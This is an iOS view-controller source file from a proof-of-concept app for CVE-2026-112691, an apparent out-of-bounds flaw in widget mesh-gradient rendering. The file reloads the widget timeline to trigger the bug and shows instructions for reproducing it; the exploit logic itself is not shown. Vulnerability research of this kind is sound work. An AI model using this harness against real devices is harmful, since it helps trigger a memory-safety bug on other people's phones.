//
//  ViewController.m
//  MeshGradientOOB
//
//  PoC for CVE-2026-112691.
//

#import "ViewController.h"
#import "MeshGradientOOB-Swift.h"

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];

    [MeshGradientOOBTimelineReloadTrigger reloadConfiguredTimeline];

    UILabel *instructions = [[UILabel alloc] init];
    instructions.translatesAutoresizingMaskIntoConstraints = NO;
    instructions.numberOfLines = 0;
    instructions.textAlignment = NSTextAlignmentCenter;
    instructions.text = @"Add the MeshGradientOOB widget to the Home Screen, "
                        @"then launch this app to request a production timeline "
                        @"archive. Extension logs appear under the "
                        @"com.licht.meshgradientoob.widget subsystem.";

    [self.view addSubview:instructions];
    [NSLayoutConstraint activateConstraints:@[
        [instructions.leadingAnchor constraintEqualToAnchor:self.view.layoutMarginsGuide.leadingAnchor],
        [instructions.trailingAnchor constraintEqualToAnchor:self.view.layoutMarginsGuide.trailingAnchor],
        [instructions.centerYAnchor constraintEqualToAnchor:self.view.centerYAnchor],
    ]];
}

@end
